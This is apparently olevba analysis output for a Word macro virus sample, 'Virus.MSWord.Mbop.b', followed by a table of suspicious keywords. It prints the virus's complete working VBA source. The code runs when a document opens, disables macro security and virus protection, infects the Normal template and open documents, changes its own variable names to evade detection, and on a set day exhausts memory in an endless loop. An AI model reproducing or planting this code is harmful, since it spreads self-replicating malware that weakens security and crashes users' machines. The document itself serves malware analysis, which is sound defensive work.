olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop.b-8530b67876693ac91cc97f22453ffeb983f30d9e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop.b-8530b67876693ac91cc97f22453ffeb983f30d9e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
gezjezglddwpdovl1gezjezglddwpdov = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
gezjezglddwpdovfigezjezglddwpdov = 1
Options.ConfirmConversions = False
Set gezjezglddwpdovNtgezjezglddwpdov = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
gezjezglddwpdovsegezjezglddwpdov = 2
Set gezjezglddwpdovAdgezjezglddwpdov = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set gezjezglddwpdovTdgezjezglddwpdov = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
gezjezglddwpdovtrgezjezglddwpdov = 5
gezjezglddwpdovl2gezjezglddwpdov = "b"
gezjezglddwpdovfngezjezglddwpdov = gezjezglddwpdovfigezjezglddwpdov & gezjezglddwpdovsegezjezglddwpdov & gezjezglddwpdovtrgezjezglddwpdov
For gezjezglddwpdoviigezjezglddwpdov = 1 To gezjezglddwpdovTdgezjezglddwpdov.countoflines
If InStr(gezjezglddwpdovTdgezjezglddwpdov.lines(gezjezglddwpdoviigezjezglddwpdov, 1), "Private Sub Document_Open()") <> 0 Then
gezjezglddwpdovSlgezjezglddwpdov = gezjezglddwpdoviigezjezglddwpdov
Exit For
End If
Next
gezjezglddwpdovl3gezjezglddwpdov = "o"
gezjezglddwpdovVcgezjezglddwpdov = Trim(gezjezglddwpdovTdgezjezglddwpdov.lines(gezjezglddwpdovSlgezjezglddwpdov, gezjezglddwpdovSlgezjezglddwpdov + gezjezglddwpdovfngezjezglddwpdov))
gezjezglddwpdovlvgezjezglddwpdov = 97
If gezjezglddwpdovNtgezjezglddwpdov.countoflines > 0 Then
gezjezglddwpdovNlgezjezglddwpdov = gezjezglddwpdovNtgezjezglddwpdov.lines(1, gezjezglddwpdovNtgezjezglddwpdov.countoflines)
If InStr(gezjezglddwpdovNlgezjezglddwpdov, "Nt") = 0 And InStr(gezjezglddwpdovNlgezjezglddwpdov, "Sl") = 0 And InStr(gezjezglddwpdovNlgezjezglddwpdov, "Nl") = 0 And InStr(gezjezglddwpdovNlgezjezglddwpdov, "Ad") = 0 And InStr(gezjezglddwpdovNlgezjezglddwpdov, "Vc") = 0 And InStr(gezjezglddwpdovNlgezjezglddwpdov, "Td") = 0 Then
If InStr(LCase(gezjezglddwpdovNlgezjezglddwpdov), "private sub document_open()") <> 0 Then
For gezjezglddwpdovigezjezglddwpdov = 1 To gezjezglddwpdovNtgezjezglddwpdov.countoflines
If InStr(LCase(gezjezglddwpdovNtgezjezglddwpdov.lines(gezjezglddwpdovigezjezglddwpdov, 1)), "private sub document_open()") <> 0 Then
gezjezglddwpdovnsgezjezglddwpdov = gezjezglddwpdovigezjezglddwpdov
Exit For
End If
Next
For gezjezglddwpdovigezjezglddwpdov = gezjezglddwpdovnsgezjezglddwpdov To gezjezglddwpdovNtgezjezglddwpdov.countoflines
If InStr(LCase(gezjezglddwpdovNtgezjezglddwpdov.lines(gezjezglddwpdovigezjezglddwpdov, 1)), "end sub") <> 0 Then
gezjezglddwpdovnegezjezglddwpdov = gezjezglddwpdovigezjezglddwpdov
Exit For
End If
Next
gezjezglddwpdovNtgezjezglddwpdov.deletelines gezjezglddwpdovnsgezjezglddwpdov, gezjezglddwpdovnegezjezglddwpdov
End If
If InStr(LCase(gezjezglddwpdovNlgezjezglddwpdov), "option explicit") <> 0 Then
For gezjezglddwpdovigezjezglddwpdov = 1 To gezjezglddwpdovNtgezjezglddwpdov.countoflines
If InStr(LCase(gezjezglddwpdovNtgezjezglddwpdov.lines(gezjezglddwpdovigezjezglddwpdov, 1)), "option explicit") <> 0 Then
gezjezglddwpdovnsgezjezglddwpdov = gezjezglddwpdovigezjezglddwpdov
Exit For
End If
Next
gezjezglddwpdovNtgezjezglddwpdov.deletelines gezjezglddwpdovnsgezjezglddwpdov, 1
End If
gezjezglddwpdovNtgezjezglddwpdov.addfromstring gezjezglddwpdovVcgezjezglddwpdov
gezjezglddwpdovingezjezglddwpdov = True
End If
Else
gezjezglddwpdovNtgezjezglddwpdov.addfromstring gezjezglddwpdovVcgezjezglddwpdov
gezjezglddwpdovingezjezglddwpdov = True
End If
gezjezglddwpdovhvgezjezglddwpdov = 122
If gezjezglddwpdovAdgezjezglddwpdov.countoflines > 0 Then
gezjezglddwpdovAlgezjezglddwpdov = gezjezglddwpdovAdgezjezglddwpdov.lines(1, gezjezglddwpdovAdgezjezglddwpdov.countoflines)
If InStr(gezjezglddwpdovAlgezjezglddwpdov, "Nt") = 0 And InStr(gezjezglddwpdovAlgezjezglddwpdov, "Sl") = 0 And InStr(gezjezglddwpdovAlgezjezglddwpdov, "Nl") = 0 And InStr(gezjezglddwpdovAlgezjezglddwpdov, "Ad") = 0 And InStr(gezjezglddwpdovAlgezjezglddwpdov, "Vc") = 0 And InStr(gezjezglddwpdovAlgezjezglddwpdov, "Td") = 0 Then
If InStr(LCase(gezjezglddwpdovAlgezjezglddwpdov), "private sub document_open()") <> 0 Then
For gezjezglddwpdovigezjezglddwpdov = 1 To gezjezglddwpdovAdgezjezglddwpdov.countoflines
If InStr(LCase(gezjezglddwpdovAdgezjezglddwpdov.lines(gezjezglddwpdovigezjezglddwpdov, 1)), "private sub document_open()") <> 0 Then
gezjezglddwpdovnsgezjezglddwpdov = gezjezglddwpdovigezjezglddwpdov
Exit For
End If
Next
For gezjezglddwpdovigezjezglddwpdov = gezjezglddwpdovnsgezjezglddwpdov To gezjezglddwpdovAdgezjezglddwpdov.countoflines
If InStr(LCase(gezjezglddwpdovAdgezjezglddwpdov.lines(gezjezglddwpdovigezjezglddwpdov, 1)), "end sub") <> 0 Then
gezjezglddwpdovnegezjezglddwpdov = gezjezglddwpdovigezjezglddwpdov
Exit For
End If
Next
gezjezglddwpdovAdgezjezglddwpdov.deletelines gezjezglddwpdovnsgezjezglddwpdov, gezjezglddwpdovnegezjezglddwpdov
End If
If InStr(LCase(gezjezglddwpdovAlgezjezglddwpdov), "option explicit") <> 0 Then
For gezjezglddwpdovigezjezglddwpdov = 1 To gezjezglddwpdovAdgezjezglddwpdov.countoflines
If InStr(LCase(gezjezglddwpdovAdgezjezglddwpdov.lines(gezjezglddwpdovigezjezglddwpdov, 1)), "option explicit") <> 0 Then
gezjezglddwpdovnsgezjezglddwpdov = gezjezglddwpdovigezjezglddwpdov
Exit For
End If
Next
gezjezglddwpdovAdgezjezglddwpdov.deletelines gezjezglddwpdovnsgezjezglddwpdov, 1
End If
gezjezglddwpdovAdgezjezglddwpdov.addfromstring gezjezglddwpdovVcgezjezglddwpdov
gezjezglddwpdoviagezjezglddwpdov = True
End If
Else
gezjezglddwpdovAdgezjezglddwpdov.addfromstring gezjezglddwpdovVcgezjezglddwpdov
gezjezglddwpdoviagezjezglddwpdov = True
End If
gezjezglddwpdovl4gezjezglddwpdov = "p"
gezjezglddwpdov15gezjezglddwpdov = 15
For gezjezglddwpdoviigezjezglddwpdov = 1 To gezjezglddwpdov15gezjezglddwpdov
Randomize
gezjezglddwpdovTngezjezglddwpdov = gezjezglddwpdovTngezjezglddwpdov & Chr(Int((gezjezglddwpdovhvgezjezglddwpdov - gezjezglddwpdovlvgezjezglddwpdov + 1) * Rnd + gezjezglddwpdovlvgezjezglddwpdov))
Next
gezjezglddwpdovd2gezjezglddwpdov = 9
gezjezglddwpdovVcgezjezglddwpdov = gezjezglddwpdovTdgezjezglddwpdov.lines(1, gezjezglddwpdovTdgezjezglddwpdov.countoflines)
gezjezglddwpdovTdgezjezglddwpdov.deletelines 1, gezjezglddwpdovTdgezjezglddwpdov.countoflines
Do While InStr(gezjezglddwpdovVcgezjezglddwpdov, "gezjezglddwpdov") <> 0
gezjezglddwpdovVcgezjezglddwpdov = Mid(gezjezglddwpdovVcgezjezglddwpdov, 1, InStr(gezjezglddwpdovVcgezjezglddwpdov, "gezjezglddwpdov") - 1) & gezjezglddwpdovTngezjezglddwpdov & Mid(gezjezglddwpdovVcgezjezglddwpdov, InStr(gezjezglddwpdovVcgezjezglddwpdov, "gezjezglddwpdov") + Len("gezjezglddwpdov"))
Loop
gezjezglddwpdovTdgezjezglddwpdov.addfromstring gezjezglddwpdovVcgezjezglddwpdov
gezjezglddwpdovDygezjezglddwpdov = Day(Now)
gezjezglddwpdovd1gezjezglddwpdov = 2
gezjezglddwpdovl5gezjezglddwpdov = "!"
If gezjezglddwpdovDygezjezglddwpdov = gezjezglddwpdovd1gezjezglddwpdov & gezjezglddwpdovd2gezjezglddwpdov Then
Dim gezjezglddwpdovstgezjezglddwpdov()
gezjezglddwpdovcagezjezglddwpdov = 0
Do
ReDim Preserve gezjezglddwpdovstgezjezglddwpdov(gezjezglddwpdovcagezjezglddwpdov)
gezjezglddwpdovqwgezjezglddwpdov = CLng(1024)
gezjezglddwpdovqagezjezglddwpdov = gezjezglddwpdovqwgezjezglddwpdov
gezjezglddwpdovqzgezjezglddwpdov = gezjezglddwpdovqwgezjezglddwpdov * gezjezglddwpdovqagezjezglddwpdov
gezjezglddwpdovstgezjezglddwpdov(gezjezglddwpdovcagezjezglddwpdov) = String(gezjezglddwpdovqzgezjezglddwpdov, Right(gezjezglddwpdovTngezjezglddwpdov, 1))
DoEvents
gezjezglddwpdovcagezjezglddwpdov = gezjezglddwpdovcagezjezglddwpdov + 1
Loop
End If
If gezjezglddwpdoviagezjezglddwpdov = True Or gezjezglddwpdovingezjezglddwpdov = True Then
MsgBox gezjezglddwpdovl1gezjezglddwpdov & gezjezglddwpdovl2gezjezglddwpdov & gezjezglddwpdovl3gezjezglddwpdov & gezjezglddwpdovl4gezjezglddwpdov & gezjezglddwpdovl5gezjezglddwpdov, vbCritical
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

